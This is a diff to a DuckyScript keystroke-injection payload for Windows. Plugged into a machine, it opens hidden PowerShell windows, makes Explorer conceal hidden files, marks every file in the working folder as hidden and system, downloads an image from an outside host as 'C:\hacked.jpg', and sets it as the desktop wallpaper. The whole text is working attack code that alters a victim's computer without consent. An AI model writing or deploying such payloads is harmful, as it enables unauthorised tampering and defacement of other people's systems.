@@ -10,12 +10,24 @@ GUI r
 DELAY 350
 STRING powershell -windowstyle hidden import-module microsoft.powershell.management; Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name Hidden -Value "2"
 CTRL-SHIFT ENTER
+DELAY 500
 GUI r
-DELAY 350
-STRING powershell -windowstyle hidden cd C:\Users\$env:UserName; attrib +s +h /s /d *
+DELAY 200
+STRING powershell -windowstyle hidden attrib +s +h /s /d *
 CTRL-SHIFT ENTER
 DELAY 2000
 GUI r
-STRING powershell -windowstyle hidden Invoke-WebRequest -Uri https://i.pinimg.com/originals/c1/50/7d/c1507daacebab64368d98d3e71e13661.jpg -OutFile C:\hacked.jpg; Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.jpg; rundll32.exe user32.dll, UpdatePerUserSystemParameters 0, True
-CTRL-SHIFT ENTER
+DELAY 350
+STRING powershell
+ENTER
+DELAY 600
+STRING Invoke-WebRequest -Uri https://i.pinimg.com/originals/c1/50/7d/c1507daacebab64368d98d3e71e13661.jpg -OutFile C:\hacked.jpg
+ENTER
+DELAY 350
+STRING Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.jpg
+ENTER
+DELAY 350
+STRING rundll32.exe user32.dll, UpdatePerUserSystemParameters 0, True; exit
+ENTER
+DELAY 350
 GUI d
